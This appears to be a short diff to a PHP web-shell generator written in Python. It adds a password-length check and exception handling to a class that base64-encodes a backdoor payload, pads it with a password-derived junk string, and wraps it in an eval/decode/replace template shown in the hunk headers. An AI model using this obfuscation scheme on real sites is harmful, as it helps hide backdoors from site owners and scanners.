@@ -45,6 +45,10 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 """
 
 	def __init__( self, password ):
+		
+		if len(password)<4:
+			raise Exception('Password \'%s\' too short, choose another one' % password)
+		
 		self.password  = password
 		self.start_key = self.password[:2]
 		self.end_key   = self.password[2:]
@@ -70,8 +74,7 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 				break
 			
 		if not pollution:
-			print "! Error generating pseudo random string, change password." 
-			return None, None
+			raise Exception('Bad randomization, choose a different password')
 			
 		str_encoded = ''
 		for char in str:
@@ -93,6 +96,7 @@ eval($%%B64_FUNC%%($%%REPL_FUNC%%("%%PAYLOAD_POLLUTION%%", "", $%%PAY_VAR%%1.$%%
 		payload_pollution, payload_polluted = self.__pollute_string(base64.b64encode(self.payload))
 		
 		replace_new_func_name = self.__random_string()
+		
 		
 		length  = len(payload_polluted)
 		offset = 7
